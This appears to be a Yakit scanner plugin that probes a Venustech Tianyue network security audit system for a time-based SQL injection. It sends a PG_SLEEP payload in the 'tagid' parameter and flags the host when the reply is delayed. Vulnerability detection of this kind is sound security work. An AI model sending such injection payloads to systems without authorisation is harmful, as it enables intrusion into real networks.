# port scan plugin
yakit.AutoInitYakit()

handleCheck = func(target,port){
    addr = str.HostPort(target, port)
    isTls = str.IsTLSServer(addr)

    packet1 = `POST /ops/index.php?c=Reportguide&a=checkrn HTTP/1.1
Host: {{params(target)}}
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36
Connection: close

checkname=123&tagid=123 AND 8475=(SELECT 8475 FROM PG_SLEEP(5))-- BAUh`

	begin_time=time.now()
    rsp,req,_ = poc.HTTP(packet1, 
    poc.params({"target":addr}),
    poc.https(isTls),
    poc.redirectTimes(0),
	poc.timeout(6),
    )
    resp_time=time.Since(begin_time)
    if int(resp_time) > 5000000000{
        yakit.Info("%v found 启明星辰 天玥网络安全审计系统 SQL 注入漏洞", addr)
        risk.NewRisk(
        addr,
        risk.title("启明星辰 天玥网络安全审计系统 SQL 注入漏洞"),
        risk.severity("high"),
        risk.titleVerbose("启明星辰 天玥网络安全审计系统 SQL 注入漏洞"),
        risk.request(string(req)),
        risk.response(string(rsp)),
        risk.cve("no cve"),
    )
    }
    return
}

handle = func(result /* *fp.MatchResult */) {
    // handle match result
    if !result.IsOpen(){
        return
    }

    if len(result.Fingerprint.HttpFlows)>0{
        handleCheck(result.Target,result.Port)
    }

}
